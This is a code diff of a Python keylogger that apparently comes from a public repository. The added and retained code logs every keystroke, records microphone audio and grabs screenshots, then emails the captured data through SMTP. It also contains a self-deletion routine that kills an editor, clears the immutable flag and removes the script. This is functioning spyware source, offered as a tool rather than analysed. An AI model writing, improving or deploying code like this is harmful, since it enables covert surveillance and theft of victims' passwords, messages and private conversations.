@@ -1,3 +1,7 @@
+# Keylogger with Email Notifications
+
+# Ensure you read README>md first
+
 try:
     import logging
     import os
@@ -17,20 +21,28 @@ try:
     import glob
 except ModuleNotFoundError:
     from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
+    modules = ["pyscreenshot", "sounddevice", "pynput"]
     call("pip install " + ' '.join(modules), shell=True)
 
 
 finally:
     EMAIL_ADDRESS = "YOUR_USERNAME"
     EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
+    SEND_REPORT_EVERY = 60  # as in seconds
+    # Disable email notifications if credentials are not set
+    email_notifications = not (
+        EMAIL_ADDRESS == "YOUR_USERNAME" or EMAIL_PASSWORD == "YOUR_PASSWORD")
+
     class KeyLogger:
-        def __init__(self, time_interval, email, password):
+        def __init__(self, time_interval, email, password, email_notifications=True):
             self.interval = time_interval
             self.log = "KeyLogger Started..."
             self.email = email
             self.password = password
+            self.email_notifications = email_notifications
+            self.ctrl_pressed = False
+            self.c_pressed = False
+            self.stop_requested = False
 
         def appendlog(self, string):
             self.log = self.log + string
@@ -51,33 +63,64 @@ finally:
             try:
                 current_key = str(key.char)
             except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
+                current_key = " " + str(key) + " "
 
             self.appendlog(current_key)
 
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
+        def send_mail(self, email, password, message, attachment_path=None):
+            if not self.email_notifications:
+                return  # Do not send email if notifications are disabled
+            sender = email
+            receiver = email  # send to self (Mailtrap inbox)
 
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
+            msg = MIMEMultipart()
+            msg['From'] = sender
+            msg['To'] = receiver
+            msg['Subject'] = 'Keylogger Report'
+            msg.attach(MIMEText(message, 'plain'))
 
-            Keylogger by aydinnyunus\n"""
+            # Attach audio file if provided
+            if attachment_path and os.path.exists(attachment_path):
+                with open(attachment_path, "rb") as f:
+                    part = MIMEBase("application", "octet-stream")
+                    part.set_payload(f.read())
+                encoders.encode_base64(part)
+                part.add_header(
+                    "Content-Disposition",
+                    f"attachment; filename={os.path.basename(attachment_path)}",
+                )
+                msg.attach(part)
 
-            m += message
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                 server.login(email, password)
-                server.sendmail(sender, receiver, message)
+                server.sendmail(sender, receiver, msg.as_string())
+
+        def microphone(self):
+            fs = 44100
+            seconds = self.interval  # Record for the reporting interval
+            filename = "audio.wav"
+            print("Recording audio...")
+            myrecording = sd.rec(
+                int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
+            sd.wait()
+            with wave.open(filename, 'wb') as wf:
+                wf.setnchannels(1)
+                wf.setsampwidth(2)
+                wf.setframerate(fs)
+                wf.writeframes(myrecording.tobytes())
+            print(f"Audio saved as {filename}")
 
         def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
+            # Save audio from microphone
+            self.microphone()
+            audio_file = "audio.wav"
+            if self.email_notifications:
+                self.send_mail(self.email, self.password, "\n\n" +
+                               self.log, attachment_path=audio_file)
+            else:
+                # Save log to a file if email is not set
+                with open("entered_keys.txt", "a", encoding="utf-8") as f:
+                    f.write(self.log + "\n")
             self.log = ""
             timer = threading.Timer(self.interval, self.report)
             timer.start()
@@ -94,25 +137,14 @@ finally:
             self.appendlog(system)
             self.appendlog(machine)
 
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
-
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+            self.send_mail(email=EMAIL_ADDRESS,
+                           password=EMAIL_PASSWORD, message=img)
 
         def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
+            keyboard_listener = keyboard.Listener(
+                on_press=self.save_data)
             with keyboard_listener:
                 self.report()
                 keyboard_listener.join()
@@ -128,18 +160,17 @@ finally:
                 except OSError:
                     print('File is close.')
 
-            else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
+                else:
+                    try:
+                        pwd = os.path.abspath(os.getcwd())
+                        os.system("cd " + pwd)
+                        os.system('pkill leafpad')
+                        os.system("chattr -i " + os.path.basename(__file__))
+                        print('File was closed.')
+                        os.system("rm -rf" + os.path.basename(__file__))
+                    except OSError:
+                        print('File is close.')
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS,
+                          EMAIL_PASSWORD, email_notifications=email_notifications)
     keylogger.run()
-
-
